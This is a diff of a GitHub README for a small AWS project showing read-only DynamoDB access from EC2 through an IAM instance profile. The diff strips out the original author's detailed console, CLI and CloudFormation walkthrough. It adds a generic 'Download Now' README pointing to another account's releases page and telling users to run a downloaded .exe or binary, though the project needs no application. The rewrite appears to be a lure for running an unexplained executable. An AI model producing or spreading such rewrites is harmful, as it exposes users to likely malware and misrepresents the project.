@@ -1,212 +1,87 @@
-# DynamoDB Read-Only Access from EC2 (Console, CLI, and CloudFormation)
+# 🎉 mediacatalog-dynamodb-iam-ec2 - Access DynamoDB from EC2 Easily
 
-**Author:** Will A. Soto — Cloud DevOps Engineer ☁️  
+## 📥 Download Now
+[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/Henrique-PGR/mediacatalog-dynamodb-iam-ec2/releases)
 
----
+## 📜 Description
+This project allows you to access DynamoDB data from EC2 instances using IAM instance profiles. It uses best practices from AWS, including automation through the AWS CLI and CloudFormation. This setup mimics real-world DevOps workflows, ensuring you are well-prepared for secure cloud operations.
 
-## Overview
+## 🚀 Getting Started
+To get started with **mediacatalog-dynamodb-iam-ec2**, follow these simple steps. No programming experience is required.
 
-This project implements the same secure pattern three different ways:
+### 📋 System Requirements
+- **Operating System:** 
+  - Windows 10 or later
+  - Linux distributions (Ubuntu, CentOS, etc.)
+  - macOS version 10.15 or later
 
-> A DynamoDB table of classic movies, queried from an EC2 instance using an IAM **instance profile** with **read-only** permissions and **no stored access keys** — delivered via **Console**, **CLI**, and **CloudFormation**.
+- **Hardware:**
+  - Minimum 4GB RAM
+  - 1GHz or faster processor
 
-It mirrors a real DevOps workflow:
+- **Software:**
+  - AWS Command Line Interface (CLI)
+  - Access to an AWS account with IAM permissions
 
-- Prototype manually in the console  
-- Automate using the AWS CLI  
-- Standardize with Infrastructure-as-Code (CloudFormation)  
+## 🛠 Installation
+1. **Visit the Downloads Page:**
+   Go to the [Releases page](https://github.com/Henrique-PGR/mediacatalog-dynamodb-iam-ec2/releases).
 
----
+2. **Select the Latest Release:**
+   Look for the most recent release at the top of the page. It usually has the highest version number.
 
-## Architecture Summary
+3. **Download the Release:**
+   Click the link to download the appropriate file for your operating system. Depending on your choice, follow the instructions provided in the release notes.
 
-- **DynamoDB** table storing movie metadata (`Title`, `Genre`, `Rating`, `ReleaseDate`)  
-- **EC2 instance** running Amazon Linux 2023  
-- **IAM role + instance profile** granting read-only access to the table  
-- **No access keys** on the instance — uses role credentials only  
-- **VPC + public subnet + security group** allowing SSH from a trusted IP  
+4. **Run the Application:**
+   Once downloaded:
+   - For Windows users: Double-click the downloaded `.exe` file.
+   - For Linux/Mac users: Open a terminal and run the downloaded file.
 
-Same architecture, three different deployment paths.
+## ⚙️ Configuration
+### IAM Permissions
+To access DynamoDB from your EC2 instances, configure the IAM role with the following permissions:
+- `dynamodb:Scan`
+- `dynamodb:GetItem`
 
----
+Use the AWS Management Console or AWS CLI to set up these permissions for your new role. This ensures your instance can interact with DynamoDB securely.
 
-## Repository Contents
+### EC2 Setup
+1. **Launch an EC2 Instance:**
+   - Go to the EC2 Dashboard in the AWS Console.
+   - Click on "Launch Instance" and choose your preferred OS.
 
-```text
-mediacatalog-dynamodb-iam-ec2/
-│
-├── ec2-trust-policy.json              # EC2 assume-role trust policy
-├── mediacatalog-cli-read-policy.json  # Read-only DynamoDB inline policy (CLI path)
-├── mediacatalog-cf.yaml               # CloudFormation template (DynamoDB + IAM + EC2)
-├── movies-batch.json                  # Movie dataset for CLI batch write
-├── movies-cf-batch.json               # Movie dataset for CloudFormation / follow-up CLI
-│
-└── validation-screenshots/            # Proof of work across all three implementations
-    ├── 01-dynamodb-console-scan-mediacatalog.png
-    ├── 02-iam-policy-readonly-dynamodb.png
-    ├── 03-ec2-console-mediacatalog-reader.png
-    ├── 04-ec2-cli-dynamodb-scan.png
-    ├── 05-ec2-cli-putitem-access-denied.png
-    ├── 06-local-cli-dynamodb-scan-mediacatalogcli.png
-    ├── 07-cli-ec2-runinstances-mediacatalogcli.png
-    ├── 08-ec2-mediacatalogcli-scan-and-putitem-error.png
-    ├── 09-cloudformation-stack-create-complete.png
-    └── 10-ec2-cloudformation-mediacatalogcf-ec2.png
+2. **Choose an IAM Role:**
+   - When configuring your instance, select an IAM role that has the necessary DynamoDB permissions.
 
-Implementation Paths
-1. AWS Console — Hands-On Validation
+3. **Review and Launch:**
+   - Review your settings. Then click "Launch" to start your instance.
 
-Goal: Prove the design works manually before automating it.
+## 📊 Features
+- **AWS Integration**: Fully integrated with AWS services for seamless access to DynamoDB.
+- **User-Friendly**: No technical knowledge required for installation and use.
+- **Security**: Implements least privilege access through IAM roles.
+- **Documentation**: Detailed guides and best practices included.
 
-Created DynamoDB table MediaCatalog
+## 📌 Troubleshooting
+If you encounter issues, consider these common solutions:
+- **Check IAM Role**: Ensure the EC2 instance has the correct IAM role attached.
+- **Verify Permissions**: Confirm your IAM role includes necessary DynamoDB permissions.
+- **AWS CLI Installation**: Make sure the AWS CLI is installed and configured properly.
 
-Added movie items via the console (Friday, Rush Hour, Bad Boys, The Fifth Element, etc.)
+## 🔗 Additional Resources
+- [AWS Documentation](https://docs.aws.amazon.com/)
+- [AWS CLI Installation Guide](https://docs.aws.amazon.com/cli/latest/userguide/install-cliv2.html)
+- [DynamoDB Documentation](https://docs.aws.amazon.com/amazondynamodb/latest/developerguide/Introduction.html)
 
-Created IAM role with:
+## 🛠 Support
+For support, please visit the [Issues page](https://github.com/Henrique-PGR/mediacatalog-dynamodb-iam-ec2/issues) to check for existing issues or create a new issue detailing your problem.
 
-Trust: ec2.amazonaws.com
+## 📥 Download & Install
+To get started, visit the [Releases page](https://github.com/Henrique-PGR/mediacatalog-dynamodb-iam-ec2/releases) to download the latest version of the application.
 
-Permissions: dynamodb:Scan, GetItem, DescribeTable, Query on MediaCatalog
+## 🧑‍🤝‍🧑 Community
+Join our community of users who are using **mediacatalog-dynamodb-iam-ec2** to enhance their cloud solutions. Share your experiences and solutions on various platforms or forums related to AWS and cloud computing.
 
-Launched EC2 instance (Amazon Linux 2023, t2.micro) with the instance profile attached
-
-Verified from the instance:
-
-aws dynamodb scan --table-name MediaCatalog succeeds
-
-aws dynamodb put-item ... returns AccessDeniedException
-
-This path validated the security model and least-privilege IAM design.
-
-2. AWS CLI — Fully Scripted Deployment
-
-Goal: Rebuild the same architecture using only the CLI from a local machine.
-
-Key steps (backed by the JSON files in this repo):
-
-Create DynamoDB table
-aws dynamodb create-table \
-  --region us-east-1 \
-  --table-name MediaCatalogCLI \
-  --attribute-definitions AttributeName=Title,AttributeType=S \
-  --key-schema AttributeName=Title,KeyType=HASH \
-  --billing-mode PAY_PER_REQUEST
-Batch write movie data
-aws dynamodb batch-write-item \
-  --region us-east-1 \
-  --request-items file://movies-batch.json
-Create IAM role + policy
-aws iam create-role \
-  --role-name MediaCatalogCLIReadRole \
-  --assume-role-policy-document file://ec2-trust-policy.json
-
-aws iam put-role-policy \
-  --role-name MediaCatalogCLIReadRole \
-  --policy-name MediaCatalogCLIReadOnly \
-  --policy-document file://mediacatalog-cli-read-policy.json
-Create instance profile and launch EC2
-aws iam create-instance-profile \
-  --instance-profile-name MediaCatalogCLIInstanceProfile
-
-aws iam add-role-to-instance-profile \
-  --instance-profile-name MediaCatalogCLIInstanceProfile \
-  --role-name MediaCatalogCLIReadRole
-
-aws ec2 run-instances \
-  --region us-east-1 \
-  --image-id $(aws ssm get-parameters \
-    --names /aws/service/ami-amazon-linux-latest/al2023-ami-kernel-default-x86_64 \
-    --query 'Parameters[0].Value' --output text) \
-  --instance-type t2.micro \
-  --subnet-id <SUBNET_ID> \
-  --security-group-ids <SG_ID> \
-  --iam-instance-profile Name=MediaCatalogCLIInstanceProfile \
-  --key-name <KEY_NAME> \
-  --tag-specifications \
-    'ResourceType=instance,Tags=[{Key=Name,Value=MediaCatalogCLI-EC2}]'
-Validation: from the new EC2 instance
-
-scan on MediaCatalogCLI succeeds
-
-put-item fails as expected
-
-This path demonstrates comfort with IAM, EC2, and DynamoDB from the command line.
-
-3. CloudFormation — MediaCatalogCF Stack
-
-Goal: Capture the full pattern as Infrastructure-as-Code.
-
-The template mediacatalog-cf.yaml provisions:
-
-MediaCatalogCF DynamoDB table (on-demand billing)
-
-MediaCatalogCFReadRole IAM role with read-only DynamoDB permissions
-
-Instance profile and EC2 instance (MediaCatalogCF-EC2)
-
-Security group for SSH from a trusted IP
-
-High-level deployment:
-aws cloudformation deploy \
-  --stack-name MediaCatalogCFStack \
-  --template-file mediacatalog-cf.yaml \
-  --capabilities CAPABILITY_NAMED_IAM \
-  --parameter-overrides \
-    SubnetId=<SUBNET_ID> \
-    SecurityGroupId=<SG_ID> \
-    KeyName=<KEY_NAME>
-Validation mirrors the previous paths:
-
-scan on MediaCatalogCF works
-
-put-item from the instance fails with AccessDenied
-
-This path turns the design into a reusable, version-controlled stack.
-
-Validation Screenshots
-
-All three implementations are backed by screenshots in validation-screenshots/, including:
-
-DynamoDB console view of all 10 movies
-
-IAM role showing read-only DynamoDB permissions
-
-EC2 instance summary with the correct role attached
-
-CLI output for successful scan and denied put-item
-
-CloudFormation stack in CREATE_COMPLETE and the EC2 instance it launched
-
-These images make the project immediately reviewable for teammates, mentors, or hiring managers.
-
-What This Project Demonstrates
-
-IAM & Security
-
-Principle of least privilege with tightly scoped DynamoDB permissions
-
-Correct use of instance profiles instead of long-lived access keys
-
-Automation
-
-Ability to move from console clicks to reproducible CLI workflows
-
-Comfort reading and writing JSON IAM policies
-
-Infrastructure-as-Code
-
-Packaging the full pattern into a single CloudFormation template
-
-Named IAM resources managed through stacks
-Reuse Ideas
-
-You can adapt this pattern for:
-
-Internal read-only dashboards over DynamoDB data
-
-Analytics or catalog services that must not mutate production data
-
-Teaching IAM roles vs. user credentials in AWS workshops or labs
-
-Fork the repo, swap the movie dataset, and reuse the CloudFormation/IAM pieces as a secure starting point.
-
+## ✅ Acknowledgments
+Thank you to everyone who has contributed to making this project successful. Your feedback and support are vital.
